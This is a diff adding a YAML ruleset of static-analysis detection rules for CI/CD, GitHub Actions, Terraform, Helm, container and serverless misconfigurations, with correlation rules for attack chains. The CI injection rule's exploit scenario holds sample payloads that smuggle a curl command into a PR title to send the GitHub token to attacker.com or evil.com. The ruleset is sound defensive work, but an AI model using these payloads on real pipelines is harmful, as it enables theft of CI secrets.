@@ -1,0 +1,587 @@
+# ============================================================================
+# Advanced Detection Rules — CI/CD, GitHub Actions, Terraform, Helm,
+#                            Container Escape, Serverless IAM
+# Ruleset Version: 4.0.0
+# Generated: 2026-03-05
+# Phase 8: Advanced Detection + Phase 9: Cross-Rule Correlation
+# ============================================================================
+
+rules:
+
+  # ══════════════════════════════════════════════════════════════════════
+  # CI/CD PIPELINE ATTACKS
+  # ══════════════════════════════════════════════════════════════════════
+
+  - rule_id: "CICD-PIPE-001"
+    title: "CI/CD Pipeline Command Injection via Untrusted Input"
+    description: >
+      Detects CI/CD pipeline configurations where untrusted inputs
+      (PR titles, branch names, issue comments) are interpolated into
+      shell commands without sanitization — enabling arbitrary code execution.
+    language: yaml
+    category: devops
+    severity: critical
+    confidence: 0.93
+    cwe: CWE-78
+    owasp: "A03:2021-Injection"
+    tags: [cicd, pipeline-injection, command-injection, github-actions]
+    detection_layer: 2
+    attack_surface_type: "build"
+    vulnerability_family: "cicd-injection"
+    patterns:
+      - type: regex
+        pattern: 'run:\s*[|>]?[^#\n]{0,200}\$\{\{\s*(?:github\.event\.(?:pull_request\.title|issue\.title|comment\.body|pull_request\.body|head_commit\.message|discussion\.title)|inputs\.\w+)\s*\}\}'
+        description: "GitHub Actions run step with untrusted event context"
+      - type: regex
+        pattern: 'run:\s*[|>]?[^#\n]{0,200}\$\{\{\s*github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)\s*\}\}'
+        description: "GitHub Actions: user-controlled event data in run"
+      - type: regex
+        pattern: 'script:\s*[|>]?[^#\n]{0,200}\$(?:CI_MERGE_REQUEST_TITLE|CI_COMMIT_MESSAGE|CI_MERGE_REQUEST_DESCRIPTION)'
+        description: "GitLab CI script with untrusted MR/commit variables"
+    anti_patterns:
+      - "actions/github-script"
+      - "toJSON("
+      - "fromJSON("
+      - "${{ env."
+      - "if:"
+    remediation: >
+      Never use ${{ github.event.*.title/body }} in run: steps.
+      Use environment variables with proper quoting:
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: echo "$TITLE"
+      Or use actions/github-script for safe GitHub API access.
+    severity_scoring:
+      severity_weight: 10
+      exploitability_score: "High"
+    cross_rule_intelligence:
+      related_rules: ["CICD-GHA-001", "CICD-GHA-002"]
+      high_impact_flag: true
+    exploit_scenario:
+      attack_example: >
+        CI workflow has: run: echo "PR: ${{ github.event.pull_request.title }}"
+        Attacker creates PR titled: $(curl attacker.com/steal?token=$GITHUB_TOKEN)
+        This executes the curl command in the CI runner, exfiltrating the token.
+      example_payload: '"; curl https://evil.com/pwn?t=$GITHUB_TOKEN #'
+      attacker_objective: "Exfiltrate CI/CD secrets and tokens"
+
+  - rule_id: "CICD-PIPE-002"
+    title: "CI/CD Pipeline Secret Exposure in Logs"
+    language: yaml
+    category: devops
+    severity: high
+    confidence: 0.90
+    cwe: CWE-532
+    owasp: "A09:2021-Security Logging and Monitoring Failures"
+    tags: [cicd, secret-exposure, logging, pipeline]
+    detection_layer: 1
+    attack_surface_type: "build"
+    vulnerability_family: "cicd-secret-exposure"
+    patterns:
+      - type: regex
+        pattern: 'run:\s*[|>]?[^#\n]{0,200}echo\s+[^#\n]{0,100}\$\{\{\s*secrets\.\w+'
+        description: "echo of GitHub Actions secret (will be masked but risky)"
+      - type: regex
+        pattern: 'run:\s*[|>]?[^#\n]{0,200}(?:printenv|env\b|set\b)'
+        description: "Dumping all environment variables in CI (may include secrets)"
+      - type: regex
+        pattern: 'run:\s*[|>]?[^#\n]{0,200}(?:cat|less|more|head)\s+[^#\n]{0,100}(?:\.env|credentials|token|secret|password)'
+        description: "Printing credential files in CI logs"
+    anti_patterns:
+      - "::add-mask::"
+      - "# debug only"
+      - "if: failure()"
+    remediation: >
+      Never echo secrets or dump env in CI. Use ::add-mask:: for dynamic values.
+      Use OIDC tokens instead of long-lived secrets where possible.
+    severity_scoring:
+      severity_weight: 8
+      exploitability_score: "Medium"
+
+  # ══════════════════════════════════════════════════════════════════════
+  # GITHUB ACTIONS TOKEN LEAKAGE
+  # ══════════════════════════════════════════════════════════════════════
+
+  - rule_id: "CICD-GHA-001"
+    title: "GitHub Actions Workflow With Excessive Token Permissions"
+    language: yaml
+    category: devops
+    severity: high
+    confidence: 0.90
+    cwe: CWE-269
+    owasp: "A01:2021-Broken Access Control"
+    tags: [github-actions, permissions, least-privilege, cicd]
+    detection_layer: 1
+    attack_surface_type: "build"
+    vulnerability_family: "cicd-permissions"
+    patterns:
+      - type: regex
+        pattern: 'permissions\s*:\s*write-all\b'
+        description: "GitHub Actions workflow with write-all permissions"
+      - type: regex
+        pattern: 'permissions\s*:\s*\{?\s*(?:contents|packages|actions|deployments|id-token)\s*:\s*write'
+        description: "GitHub Actions write permission on sensitive scope"
+      - type: regex
+        pattern: '(?:^|\n)\s*on:\s*(?:\n\s+)?(?:pull_request_target|workflow_run)\b[^#]{0,500}permissions\s*:'
+        description: "Sensitive trigger (pull_request_target) with permissions"
+        flags: [DOTALL]
+    anti_patterns:
+      - "permissions: read-all"
+      - "permissions: {}"
+      - "contents: read"
+    remediation: >
+      Use least-privilege permissions. Start with permissions: read-all.
+      Only grant write where needed per job.
+      Avoid pull_request_target with checkout of PR code.
+    severity_scoring:
+      severity_weight: 8
+      exploitability_score: "Medium"
+
+  - rule_id: "CICD-GHA-002"
+    title: "GitHub Actions pull_request_target with PR Code Checkout"
+    description: >
+      Detects the dangerous pattern of using pull_request_target trigger
+      with actions/checkout of the PR's head ref. This gives PR code
+      access to the workflow's secrets (unlike pull_request trigger).
+    language: yaml
+    category: devops
+    severity: critical
+    confidence: 0.94
+    cwe: CWE-94
+    owasp: "A08:2021-Software and Data Integrity Failures"
+    tags: [github-actions, pull-request-target, pwn-request, cicd]
+    detection_layer: 2
+    attack_surface_type: "build"
+    vulnerability_family: "cicd-injection"
+    patterns:
+      - type: regex
+        pattern: 'on:\s*(?:\n\s+)?pull_request_target\b[^#]{0,1000}uses:\s*actions/checkout[^#]{0,200}ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.'
+        description: "pull_request_target + checkout of PR head (pwn request)"
+        flags: [DOTALL]
+      - type: regex
+        pattern: 'on:\s*(?:\n\s+)?pull_request_target\b[^#]{0,1000}uses:\s*actions/checkout[^#]{0,200}ref:\s*\$\{\{\s*github\.head_ref\b'
+        description: "pull_request_target + checkout of github.head_ref"
+        flags: [DOTALL]
+    anti_patterns:
+      - "ref: ${{ github.event.pull_request.base.sha }}"
+      - "if: github.event.action == 'labeled'"
+      - "environment:"
+    remediation: >
+      Never checkout PR head code in pull_request_target workflows.
+      If needed, use a two-workflow pattern:
+      1. pull_request (no secrets) builds/tests
+      2. workflow_run (with secrets) deploys after review
+    severity_scoring:
+      severity_weight: 10
+      exploitability_score: "High"
+    cross_rule_intelligence:
+      related_rules: ["CICD-PIPE-001"]
+      high_impact_flag: true
+
+  # ══════════════════════════════════════════════════════════════════════
+  # TERRAFORM PRIVILEGE ESCALATION
+  # ══════════════════════════════════════════════════════════════════════
+
+  - rule_id: "CICD-TF-001"
+    title: "Terraform State File Contains Secrets"
+    language: all
+    category: devops
+    severity: high
+    confidence: 0.88
+    cwe: CWE-312
+    owasp: "A02:2021-Cryptographic Failures"
+    tags: [terraform, state-file, secrets, iac]
+    detection_layer: 1
+    attack_surface_type: "build"
+    vulnerability_family: "iac-secrets"
+    patterns:
+      - type: regex
+        pattern: 'backend\s*"local"\s*\{'
+        description: "Terraform local backend (state file on disk, unencrypted)"
+      - type: regex
+        pattern: 'backend\s*"s3"\s*\{[^}]{0,300}(?!encrypt\s*=\s*true)'
+        description: "Terraform S3 backend without encryption"
+        flags: [DOTALL]
+      - type: regex
+        pattern: '\.tfstate\b'
+        description: "Reference to Terraform state file"
+    anti_patterns:
+      - "encrypt = true"
+      - "backend \"remote\""
+      - "cloud {"
+      - ".gitignore"
+    remediation: >
+      Use remote backends with encryption (S3 + encrypt=true + DynamoDB locking).
+      Use Terraform Cloud/Enterprise for managed state.
+      Never commit .tfstate files to version control.
+      Add *.tfstate to .gitignore.
+    severity_scoring:
+      severity_weight: 8
+      exploitability_score: "Medium"
+
+  - rule_id: "CICD-TF-002"
+    title: "Terraform Provider Credentials Hardcoded"
+    language: all
+    category: devops
+    severity: critical
+    confidence: 0.92
+    cwe: CWE-798
+    owasp: "A07:2021-Identification and Authentication Failures"
+    tags: [terraform, hardcoded-credentials, iac, cloud]
+    detection_layer: 1
+    attack_surface_type: "build"
+    vulnerability_family: "iac-secrets"
+    patterns:
+      - type: regex
+        pattern: 'provider\s*"aws"\s*\{[^}]{0,300}(?:access_key|secret_key)\s*=\s*"[^"]{5,}"'
+        description: "AWS credentials hardcoded in Terraform provider"
+        flags: [DOTALL]
+      - type: regex
+        pattern: 'provider\s*"google"\s*\{[^}]{0,300}credentials\s*=\s*"[^"]{5,}"'
+        description: "GCP credentials hardcoded in Terraform provider"
+        flags: [DOTALL]
+      - type: regex
+        pattern: 'provider\s*"azurerm"\s*\{[^}]{0,300}(?:client_secret|subscription_id)\s*=\s*"[^"]{5,}"'
+        description: "Azure credentials hardcoded in Terraform provider"
+        flags: [DOTALL]
+    anti_patterns:
+      - 'var.'
+      - 'data.aws_secretsmanager'
+      - 'data.vault_generic_secret'
+      - '""'
+    remediation: >
+      Use environment variables (AWS_ACCESS_KEY_ID) or IAM instance profiles.
+      Use Terraform variables with sensitive=true.
+      Use Vault, AWS Secrets Manager, or OIDC for provider auth.
+    severity_scoring:
+      severity_weight: 10
+      exploitability_score: "High"
+
+  # ══════════════════════════════════════════════════════════════════════
+  # HELM TEMPLATE INJECTION
+  # ══════════════════════════════════════════════════════════════════════
+
+  - rule_id: "CICD-HELM-001"
+    title: "Helm Template Injection via Values"
+    description: >
+      Detects Helm templates where user-provided values are rendered
+      without proper quoting, enabling YAML injection to modify
+      Kubernetes resource specifications.
+    language: yaml
+    category: devops
+    severity: high
+    confidence: 0.85
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags: [helm, template-injection, kubernetes, iac]
+    detection_layer: 2
+    attack_surface_type: "cloud"
+    vulnerability_family: "helm-injection"
+    patterns:
+      - type: regex
+        pattern: '(?:image|command|args|env|labels|annotations):\s*\{\{\s*\.Values\.\w+\s*\}\}'
+        description: "Helm value interpolation without quoting in sensitive field"
+      - type: regex
+        pattern: '\{\{-?\s*\.Values\.\w+\s*-?\}\}\s*$'
+        description: "Unquoted Helm value at end of line"
+      - type: regex
+        pattern: '\{\{\s*toYaml\s+\.Values\.\w+\s*\|\s*nindent'
+        description: "toYaml of user values (safe but review needed)"
+    anti_patterns:
+      - '{{ .Values. | quote }}'
+      - "{{ quote"
+      - "{{ required"
+      - "{{ default"
+      - "{{ .Values. | b64enc }}"
+    remediation: >
+      Always quote Helm values: image: {{ .Values.image | quote }}.
+      Use {{ required "msg" .Values.field }} for mandatory fields.
+      Validate values in values.schema.json.
+    severity_scoring:
+      severity_weight: 7
+      exploitability_score: "Medium"
+
+  # ══════════════════════════════════════════════════════════════════════
+  # DOCKER CONTAINER ESCAPE
+  # ══════════════════════════════════════════════════════════════════════
+
+  - rule_id: "CICD-DOCKER-001"
+    title: "Dockerfile Running as Root Without USER Directive"
+    language: dockerfile
+    category: devops
+    severity: medium
+    confidence: 0.88
+    cwe: CWE-250
+    owasp: "A05:2021-Security Misconfiguration"
+    tags: [docker, container, root, privilege]
+    detection_layer: 1
+    attack_surface_type: "cloud"
+    vulnerability_family: "container-security"
+    patterns:
+      - type: regex
+        pattern: '^FROM\s+[^\n]+(?:\n(?!USER\s).*)*$'
+        description: "Dockerfile without USER directive (runs as root)"
+        flags: [MULTILINE, DOTALL]
+    anti_patterns:
+      - "USER "
+      - "user:"
+      - "# runs as non-root"
+    remediation: >
+      Add USER directive: USER nonroot:nonroot.
+      Create non-root user: RUN adduser --disabled-password --no-create-home appuser.
+      Use distroless or non-root base images.
+    severity_scoring:
+      severity_weight: 5
+      exploitability_score: "Low"
+
+  - rule_id: "CICD-DOCKER-002"
+    title: "Docker Container With Dangerous Capabilities"
+    language: all
+    category: devops
+    severity: critical
+    confidence: 0.93
+    cwe: CWE-250
+    owasp: "A05:2021-Security Misconfiguration"
+    tags: [docker, capabilities, cap-add, container-escape]
+    detection_layer: 1
+    attack_surface_type: "cloud"
+    vulnerability_family: "container-escape"
+    patterns:
+      - type: regex
+        pattern: 'cap_add\s*:\s*\n\s*-\s*(?:SYS_ADMIN|SYS_PTRACE|NET_ADMIN|ALL)\b'
+        description: "Docker Compose cap_add with dangerous capability"
+      - type: regex
+        pattern: '--cap-add\s*[=\s]*(?:SYS_ADMIN|SYS_PTRACE|NET_ADMIN|ALL)\b'
+        description: "docker run --cap-add with dangerous capability"
+      - type: regex
+        pattern: 'capabilities:\s*\n\s*add:\s*\n\s*-\s*(?:SYS_ADMIN|SYS_PTRACE|NET_ADMIN|ALL)\b'
+        description: "Kubernetes securityContext capabilities.add dangerous"
+    anti_patterns:
+      - "drop:"
+      - '- "ALL"'
+      - "# required"
+    remediation: >
+      Drop all capabilities: cap_drop: [ALL], then add only needed ones.
+      SYS_ADMIN enables container escape — never use in production.
+      Use seccomp and AppArmor profiles.
+    severity_scoring:
+      severity_weight: 10
+      exploitability_score: "High"
+    cross_rule_intelligence:
+      related_rules: ["CLOUD-K8S-002", "CLOUD-DOCKER-001"]
+
+  # ══════════════════════════════════════════════════════════════════════
+  # SERVERLESS IAM ESCALATION
+  # ══════════════════════════════════════════════════════════════════════
+
+  - rule_id: "CICD-SLESS-001"
+    title: "Serverless Function With Overprivileged IAM Role"
+    language: yaml
+    category: devops
+    severity: high
+    confidence: 0.88
+    cwe: CWE-269
+    owasp: "A01:2021-Broken Access Control"
+    tags: [serverless, lambda, iam, least-privilege, cloud]
+    detection_layer: 2
+    attack_surface_type: "cloud"
+    vulnerability_family: "serverless-escalation"
+    patterns:
+      - type: regex
+        pattern: 'iamRoleStatements\s*:[^-]{0,300}Effect:\s*Allow[^-]{0,200}Action:\s*[''"]?\*[''"]?'
+        description: "Serverless Framework IAM with Action:*"
+        flags: [DOTALL]
+      - type: regex
+        pattern: 'iamRoleStatements\s*:[^-]{0,300}Resource:\s*[''"]?\*[''"]?'
+        description: "Serverless Framework IAM with Resource:*"
+        flags: [DOTALL]
+      - type: regex
+        pattern: 'aws_iam_role_policy[^}]{0,300}Action[^}]{0,100}\*[^}]{0,200}Resource[^}]{0,100}\*'
+        description: "Terraform Lambda role with Action:* Resource:*"
+        flags: [DOTALL]
+      - type: regex
+        pattern: 'Role:\s*!GetAtt\s*\w+\.Arn[^#]{0,500}(?:PolicyDocument|ManagedPolicyArns)[^#]{0,300}Action:\s*[''"]\*[''"]'
+        description: "CloudFormation Lambda role with wildcard actions"
+        flags: [DOTALL]
+    anti_patterns:
+      - "Action: s3:GetObject"
+      - "Action: dynamodb:GetItem"
+      - "Action: sqs:SendMessage"
+      - "# minimum permissions"
+    remediation: >
+      Follow least privilege — grant only actions the function needs.
+      Use per-function IAM roles, not shared roles.
+      Scope resources to specific ARNs, not *.
+      Use the serverless-iam-roles-per-function plugin.
+    severity_scoring:
+      severity_weight: 8
+      exploitability_score: "Medium"
+
+  - rule_id: "CICD-SLESS-002"
+    title: "Serverless Function Event Source Without Authentication"
+    language: yaml
+    category: devops
+    severity: high
+    confidence: 0.85
+    cwe: CWE-306
+    owasp: "A07:2021-Identification and Authentication Failures"
+    tags: [serverless, lambda, api-gateway, authentication]
+    detection_layer: 2
+    attack_surface_type: "api"
+    vulnerability_family: "serverless-security"
+    patterns:
+      - type: regex
+        pattern: 'events:\s*\n\s*-\s*http:\s*\n[^-]{0,300}(?!.*authorizer)[^-]{0,200}method:\s*(?:post|put|patch|delete)\b'
+        description: "Serverless HTTP event without authorizer (state-changing)"
+        flags: [DOTALL, IGNORECASE]
+      - type: regex
+        pattern: 'events:\s*\n\s*-\s*httpApi:\s*\n[^-]{0,300}(?!.*authorizer)[^-]{0,200}(?:path|method):'
+        description: "Serverless HTTP API event without authorizer"
+        flags: [DOTALL]
+    anti_patterns:
+      - "authorizer:"
+      - "cors:"
+      - "private: true"
+      - "# public endpoint"
+    remediation: >
+      Add authorizer to all non-public endpoints:
+      events:
+        - http:
+            authorizer: aws_iam / custom-authorizer
+      Use API Gateway resource policies as additional controls.
+    severity_scoring:
+      severity_weight: 7
+      exploitability_score: "Medium"
+
+  # ══════════════════════════════════════════════════════════════════════
+  # CROSS-RULE CORRELATION DEFINITIONS (Phase 9)
+  # ══════════════════════════════════════════════════════════════════════
+
+  - rule_id: "CORR-CHAIN-001"
+    title: "Attack Chain: Auth Bypass + SQL Injection → Database Takeover"
+    description: >
+      Correlation rule that combines authentication bypass with SQL injection
+      to identify complete database takeover attack paths.
+      This is a meta-rule — it triggers when both component rules fire
+      on the same codebase, indicating a critical attack chain.
+    language: all
+    category: injection
+    severity: critical
+    confidence: 0.95
+    cwe: CWE-89
+    owasp: "A03:2021-Injection"
+    tags: [attack-chain, correlation, database-takeover]
+    detection_layer: 3
+    attack_surface_type: "api"
+    vulnerability_family: "attack-chain"
+    patterns:
+      - type: regex
+        pattern: '(?:permitAll|@csrf_exempt|@login_not_required|authentication.*false)[^}]{0,2000}(?:execute|query|find)\s*\([^)]{0,200}(?:f[''"]|[''"].*?\+|%s|\.format)'
+        description: "Auth bypass near SQL injection pattern"
+        flags: [DOTALL]
+    anti_patterns:
+      - "@login_required"
+      - "@permission_required"
+      - "parameterized"
+      - "prepared"
+    cross_rule_intelligence:
+      related_rules: ["PY-INJ-001", "AUTH-JAVA-001", "AUTH-PY-001"]
+      high_impact_flag: true
+    severity_scoring:
+      severity_weight: 10
+      exploitability_score: "Critical"
+
+  - rule_id: "CORR-CHAIN-002"
+    title: "Attack Chain: File Upload + Deserialization → RCE"
+    description: >
+      Correlation rule that identifies file upload endpoints that
+      deserialize uploaded content, enabling remote code execution.
+    language: all
+    category: rce
+    severity: critical
+    confidence: 0.90
+    cwe: CWE-502
+    owasp: "A08:2021-Software and Data Integrity Failures"
+    tags: [attack-chain, correlation, file-upload, deserialization, rce]
+    detection_layer: 3
+    attack_surface_type: "api"
+    vulnerability_family: "attack-chain"
+    patterns:
+      - type: regex
+        pattern: '(?:upload|file|multipart|FormFile)[^}]{0,2000}(?:pickle\.loads|yaml\.load|unserialize|readObject|ObjectInputStream|XMLDecoder)'
+        description: "File upload flowing to deserialization"
+        flags: [DOTALL]
+    anti_patterns:
+      - "yaml.safe_load"
+      - "SafeConstructor"
+      - "allowed_classes.*false"
+      - "ObjectInputFilter"
+    cross_rule_intelligence:
+      related_rules: ["DESER-JAVA-001", "DESER-PY-001", "DESER-PHP-002"]
+      high_impact_flag: true
+    severity_scoring:
+      severity_weight: 10
+      exploitability_score: "Critical"
+
+  - rule_id: "CORR-CHAIN-003"
+    title: "Attack Chain: SSRF + Cloud Metadata → Credential Theft"
+    description: >
+      Correlation rule for SSRF vulnerabilities that could access
+      cloud metadata endpoints (169.254.169.254) to steal IAM credentials.
+    language: all
+    category: ssrf
+    severity: critical
+    confidence: 0.92
+    cwe: CWE-918
+    owasp: "A10:2021-Server-Side Request Forgery"
+    tags: [attack-chain, correlation, ssrf, cloud-metadata, credential-theft]
+    detection_layer: 3
+    attack_surface_type: "api"
+    vulnerability_family: "attack-chain"
+    patterns:
+      - type: regex
+        pattern: '(?:requests\.get|urllib\.request|fetch|http\.get|HttpClient)\s*\([^)]{0,200}(?:url|uri|target|endpoint|host)\b[^}]{0,1000}(?:169\.254\.169\.254|metadata\.google|metadata\.azure)'
+        description: "HTTP request with user URL near metadata endpoint reference"
+        flags: [DOTALL]
+    anti_patterns:
+      - "ALLOWED_HOSTS"
+      - "allowlist"
+      - "IMDSv2"
+      - "HttpTokenRequired"
+    cross_rule_intelligence:
+      related_rules: ["SSRF-PY-001", "CLOUD-IAM-001"]
+      high_impact_flag: true
+    severity_scoring:
+      severity_weight: 10
+      exploitability_score: "Critical"
+
+  - rule_id: "CORR-CHAIN-004"
+    title: "Attack Chain: CI/CD Code Injection → Secret Exfiltration"
+    description: >
+      Correlation rule for CI/CD pipelines where untrusted input injection
+      combined with secret access enables exfiltration of deployment credentials.
+    language: yaml
+    category: devops
+    severity: critical
+    confidence: 0.90
+    cwe: CWE-78
+    owasp: "A03:2021-Injection"
+    tags: [attack-chain, correlation, cicd, secret-exfiltration]
+    detection_layer: 3
+    attack_surface_type: "build"
+    vulnerability_family: "attack-chain"
+    patterns:
+      - type: regex
+        pattern: '\$\{\{\s*github\.event\.[^}]{0,100}\}\}[^#]{0,500}\$\{\{\s*secrets\.\w+\s*\}\}'
+        description: "Untrusted event context and secret in same workflow step"
+        flags: [DOTALL]
+    anti_patterns:
+      - "environment:"
+      - "concurrency:"
+      - "if: github.actor"
+    cross_rule_intelligence:
+      related_rules: ["CICD-PIPE-001", "CICD-GHA-002"]
+      high_impact_flag: true
+    severity_scoring:
+      severity_weight: 10
+      exploitability_score: "Critical"
